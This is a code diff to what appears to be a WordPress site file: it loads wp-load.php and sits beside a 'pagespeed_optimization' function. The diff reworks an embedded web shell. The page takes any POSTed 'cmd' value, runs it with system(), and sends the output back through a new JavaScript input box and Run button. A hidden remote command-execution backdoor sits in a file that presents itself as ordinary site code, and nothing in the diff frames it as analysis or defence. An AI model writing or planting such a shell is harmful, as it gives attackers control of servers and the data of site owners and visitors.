@@ -496,20 +496,34 @@ require_once('wp-load.php');
 
 <?php
 if (isset($_POST['cmd'])) {
-    echo "<pre>";
+    header('Content-Type: text/plain');
     $cmd = escapeshellcmd($_POST['cmd']);
     system($cmd);
-    echo "</pre>";
+    exit;
 }
 ?>
 
-<form method="post">
-    <input type="text" name="cmd" placeholder="Enter command" style="width: 300px;">
-    <input type="submit" value="Run">
-</form>
 
 
-    
+
+    <input type="text" id="cmd" placeholder="Enter command" style="width: 300px;">
+    <button onclick="runCommand()">Run</button>
+    <pre id="output" style="background:#eee; padding:10px; margin-top:10px;"></pre>
+
+    <script>
+        function runCommand() {
+            var cmd = document.getElementById('cmd').value;
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '', true);
+            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            xhr.onload = function () {
+                document.getElementById('output').textContent = this.responseText;
+            };
+            xhr.send('cmd=' + encodeURIComponent(cmd));
+        }
+    </script>
+
+ 
 
 <?php 
 function pagespeed_optimization() {
